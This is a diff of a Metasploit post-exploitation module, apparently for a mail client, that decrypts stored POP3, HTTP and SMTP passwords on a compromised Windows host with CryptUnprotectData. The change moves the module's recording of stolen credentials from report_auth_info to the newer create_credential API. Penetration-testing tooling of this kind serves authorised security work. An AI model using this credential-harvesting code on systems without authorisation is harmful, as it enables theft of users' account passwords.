@@ -54,7 +54,6 @@ class Metasploit3 < Msf::Post
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
-      #print_status("#{ret.inspect}")
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = [mem].pack("Q")
@@ -141,7 +140,7 @@ class Metasploit3 < Msf::Post
             pop3_pw.slice!(0,1)
             pass = decrypt_password(pop3_pw)
             print_status("     User Password: #{pass}")
-            # Prepare data for report_auth_info
+            # Prepare data for creds
             got_user_pw = 1
             host = pop3_server
             user = pop3_user
@@ -215,7 +214,7 @@ class Metasploit3 < Msf::Post
             host = http_server_url
             user = http_user
 
-            #Detect 80 or 443 for report_auth_info
+            #Detect 80 or 443 for creds
             http_server_url.downcase!
             if http_server_url.include? "h\x00t\x00t\x00p\x00s"
               portnum = 443
@@ -303,37 +302,61 @@ class Metasploit3 < Msf::Post
         end
 
         if got_user_pw == 1
-          if session.db_record
-            source_id = session.db_record.id
-          else
-            source_id = nil
-          end
-          report_auth_info(
-            :host  => host,
-            :port => portnum,
-            :sname => type,
-            :source_id => source_id,
-            :source_type => "exploit",
-            :user => user,
-            :pass => pass)
-          #print_status("CHK report_auth_info: host = #{host}, port= #{portnum}, sname= #{type}, user= #{user}, pass= #{pass}")
+          service_data = {
+            address: Rex::Socket.getaddress(host),
+            port: portnum,
+            protocol: "tcp",
+            service_name: type,
+            workspace_id: myworkspace_id
+          }
+
+          credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            username: user,
+            private_data: pass,
+            private_type: :password
+          }
+
+          credential_core = create_credential(credential_data.merge(service_data))
+
+          login_data = {
+            core: credential_core,
+            access_level: "User",
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }
+
+          create_credential_login(login_data.merge(service_data))
         end
 
         if smtp_use_auth != nil
-          if session.db_record
-            source_id = session.db_record.id
-          else
-            source_id = nil
-          end
-          report_auth_info(
-            :host  => smtp_server,
-            :port => smtp_port,
-            :sname => "smtp",
-            :source_id => source_id,
-            :source_type => "exploit",
-            :user => smtp_user,
-            :pass => smtp_decrypted_password)
-          #print_status("SMTP report_auth_info: host = #{smtp_server}, port= #{smtp_port}, sname= SMTP, user= #{smtp_user}, pass= #{smtp_decrypted_password}")
+          service_data = {
+            address: Rex::Socket.getaddress(smtp_server),
+            port: smtp_port,
+            protocol: "tcp",
+            service_name: "smtp",
+            workspace_id: myworkspace_id
+          }
+
+          credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            username: smtp_user,
+            private_data: smtp_decrypted_password,
+            private_type: :password
+          }
+
+          credential_core = create_credential(credential_data.merge(service_data))
+
+          login_data = {
+            core: credential_core,
+            access_level: "User",
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }
+
+          create_credential_login(login_data.merge(service_data))
         end
 
         print_status("")
